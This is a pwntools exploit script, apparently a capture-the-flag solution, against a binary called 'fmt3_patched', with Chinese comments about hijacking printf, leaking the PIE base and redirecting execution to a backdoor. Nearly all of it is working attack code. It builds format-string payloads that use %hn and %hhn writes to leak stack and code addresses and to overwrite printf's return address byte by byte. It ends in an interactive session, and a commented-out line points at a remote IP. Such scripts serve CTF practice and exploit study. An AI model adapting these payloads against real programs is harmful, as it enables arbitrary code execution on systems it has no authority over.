from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
io = process("./fmt3_patched")
#io = remote("219.216.65.41",37422)
'''劫持printf'''

io.recvuntil(b":0x")
rsp = io.recv(12).decode().rjust(16,'0')
rsp = int(rsp,16)-0x4
success(hex(rsp))

payload1=b'%p'*11+b'%'+str(((rsp-0x8)-110-7)&0xffff).encode()+b'c%hn'
payload1+=b'%p'*28+b'%'+str(0x1000a1-(((rsp-0x8)-110-7)&0xffff)+0x57).encode()+b'c%hhn'
io.send(payload1)

'''泄露pie'''

io.recvuntil(b":0x")
payload2=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload2+=b'%11$p\x00\x00'
#gdb.attach(io)
io.send(payload2)
io.recvuntil(b'0x')
buf = io.recv(12).decode().rjust(16,'0')
pie = int(buf,16)-0x127c
success(hex(pie))

'''覆盖printf返回地址的下一个地址为backdoor'''

backdoor=pie+0x11ed

io.recvuntil(b":")
gdb.attach(io)
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str((rsp-0xa1)&0xffff).encode()+b'c%30$hn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str((backdoor-0xa1)&0xff).encode()+b'c%45$hhn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str((rsp-0xa1+0x1)&0xffff).encode()+b'c%30$hn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
success(hex(backdoor))
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str(((backdoor>>8)-0xa1)&0xff).encode()+b'c%45$hhn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str((rsp-0xa1+0x2)&0xffff).encode()+b'c%30$hn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
success(hex(backdoor))
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str(((backdoor>>16)-0xa1)&0xff).encode()+b'c%45$hhn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str((rsp-0xa1+0x3)&0xffff).encode()+b'c%30$hn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
success(hex(backdoor))
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str(((backdoor>>24)-0xa1)&0xff).encode()+b'c%45$hhn\x00'
io.send(payload3)

io.recvuntil(b":")
#gdb.attach(io)
payload3=b'%'+str(0xa1).encode()+b'c%43$hhn'
payload3+=b'%'+str((rsp-0xa1+0x4)&0xffff).encode()+b'c%30$hn\x00'
io.send(payload3)

'''劫持printf的返回地址为ret滑入backdoor'''

io.recvuntil(b":")
#gdb.attach(io)
success(hex(backdoor))
payload3=b'%'+str(0x7b).encode()+b'c%43$hhn'
payload3+=b'%'+str(((backdoor>>32)-0x7b)&0xffff).encode()+b'c%45$hn\x00'
io.send(payload3)


io.interactive()